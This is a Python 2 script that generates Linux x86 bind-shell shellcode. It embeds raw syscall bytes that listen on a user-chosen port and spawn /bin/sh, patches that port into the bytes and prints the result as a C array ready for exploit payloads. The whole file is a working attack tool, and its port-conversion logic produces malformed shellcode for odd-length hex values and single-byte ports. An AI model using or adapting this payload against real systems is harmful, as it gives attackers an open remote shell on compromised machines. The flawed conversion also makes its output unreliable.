#!/usr/bin/env python
#
# Description	: Simply uses the bind shell I created and inserts
#                 the users desired port.
#

import sys

try:
	port = int(sys.argv[1])
except:
	print "Usage: %s <port>" % sys.argv[0]
	print "Example: %s 4444" % sys.argv[0]
	sys.exit(0)

com = "\"" # for shellcode qoutes

buf = ""
buf += "\\x6a\\x66\\x58\\x99\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x5b\\x5e"
buf += "\\x52\\x66\\x68\\x00\\x00\\x52\\x6a\\x02\\x6a\\x10\\x51\\x50\\x89\\xe1\\xb0"
buf += "\\x66\\xcd\\x80\\x89\\x41\\x04\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x43\\xb0\\x66"
buf += "\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x2f\\x2f\\x73"
buf += "\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

# check if port less than 1024 or greater that 65535
print "[+] Shellcode byte length: %d" % (len(buf))
if port < 1024:
	print "[-] Privledged port chosen must run as root"
if port > 65535:
	print "[!] There are only 65535 ports"
	sys.exit(0)
print "[+] Using port: %d" % (port)

# convert to hexadeximal
port = hex(port).split('x')[-1]
# place in shellcode format
if len(port) > 2:
	port = "\\x" + port[0:2] + "\\x" + port[2:4]
if len(port) <= 2:
	port = "\\x" + port[0:2]
# NO NULLS! Replace them with our port
newp = buf.replace("\\x00\\x00", port)
# print the shellcode evenly
print "[+] Final shellcode: \n"
print "char shellcode[]= "
splt = [newp[x:x+60] for x in range(0,len(newp),60)]
for i in range(len(splt)):
	if i == (len(splt) - 1):
		print com + splt[i] + com + ";"
	else:
		print com + splt[i] + com
